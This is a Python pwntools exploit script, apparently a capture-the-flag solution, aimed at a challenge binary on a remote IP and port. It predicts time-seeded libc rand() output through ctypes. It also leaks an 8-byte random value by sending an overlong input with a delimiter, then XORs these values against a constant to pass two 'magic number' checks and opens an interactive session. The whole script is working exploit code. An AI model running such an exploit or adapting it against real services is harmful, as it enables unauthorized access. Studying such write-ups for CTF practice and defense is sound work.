from pwn import *
from ctypes import *
import time

context.log_level = 'debug'
context.arch = "amd64"

proc = CDLL("/usr/lib/x86_64-linux-gnu/libc.so.6")
timefunc = proc.time
srand = proc.srand
rand = proc.rand

def rand_value():
    srand(timefunc(0))
    randnum = rand()
    log.info("rand_value: %d" % randnum)
    return randnum
    
def Time_Freeze():
    return timefunc(0)+1

e = context.binary = ELF('source')
# r= e.process()
r= remote("34.126.117.161",2000)
lib = e.libc


result  = 0xDEADBEEFDEADC0DE

def Elementary_Magic():
    r.recvuntil(b"================================Elementary_Magic================================\n")
    time = int(r.recvline(),10)
    rand = proc.rand
    srand = proc.srand
    srand(time)
    randnum = rand()
    print(randnum)

    r.sendafter(b"Pause time, enter to continue:",b"\x0a")
    time    = Time_Freeze()

    number  = c_longlong(result^randnum^time)
    print("My Input_Number: ")
    print(number.value)
    pause()
    r.sendlineafter(b"Shout out the magic number sequence!\n", str(number.value))
    # r.interactive()

def Advanced_Magic():
    print("LV2:")
    pause()
    r.sendafter(b"Scream your advanced magic!",b"a"*30 +b"::")
    r.recvuntil(b"::")
    urand_num = u64(r.recv(8).ljust(8,b"\x00"))
    print("My urandnum: ")
    print(hex(urand_num))

    pause()
    r.sendafter(b"Pause time, enter to continue:",b"\x0a")
    srand_val= rand_value()

    number  = c_longlong(result^urand_num^srand_val) 
    print("My Input_Number: ")
    print(number.value)
    pause()
    r.sendlineafter(b"Shout out the magic number sequence!", str(number.value))
    
Elementary_Magic()
Advanced_Magic()
print(r.recvall())
r.interactive()



    
